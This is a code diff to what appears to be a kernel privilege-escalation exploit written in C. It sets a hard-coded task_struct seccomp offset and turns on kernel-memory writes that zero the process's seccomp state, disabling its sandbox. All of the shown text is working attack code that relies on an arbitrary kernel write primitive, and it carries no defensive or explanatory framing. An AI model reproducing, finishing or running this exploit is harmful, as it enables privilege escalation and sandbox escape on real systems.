@@ -406,7 +406,7 @@ void kernel_write_uchar(unsigned long kaddr, unsigned char data) {
 #define OFFSET__task_struct__mm    0x308
 //#define OFFSET__task_struct__comm 0x558 // not needed
 #define OFFSET__task_struct__cred 0x550
-#define OFFSET__task_struct__seccomp  (OFFSET__task_struct__cred+0xa0) // WRONG!??!
+#define OFFSET__task_struct__seccomp  0x9b0 // WRONG!??!
 #define OFFSET__cred__uid 0x004
 #define OFFSET__cred__securebits    0x024
 #define OFFSET__cred__cap_inheritable 0x028
@@ -605,10 +605,10 @@ int main(int argc, char** argv) {
   
   printf("MAIN: SECCOMP status %d\n", prctl(PR_GET_SECCOMP));
   if (prctl(PR_GET_SECCOMP)) {
-    printf("MAIN: *TODO*: disabling SECCOMP\n");
+    printf("MAIN: disabling SECCOMP\n");
     kernel_write_ulong(thread_info_ptr + OFFSET__thread_info__flags, 0);
-    //kernel_write_ulong(task_struct_ptr + OFFSET__task_struct__seccomp + 8, 0);
-    //kernel_write_ulong(task_struct_ptr + OFFSET__task_struct__seccomp, 0);
+    kernel_write_ulong(task_struct_ptr + OFFSET__task_struct__seccomp, 0);
+    kernel_write_ulong(task_struct_ptr + OFFSET__task_struct__seccomp + 8, 0);
   }
   printf("MAIN: SECCOMP status %d\n", prctl(PR_GET_SECCOMP));
   
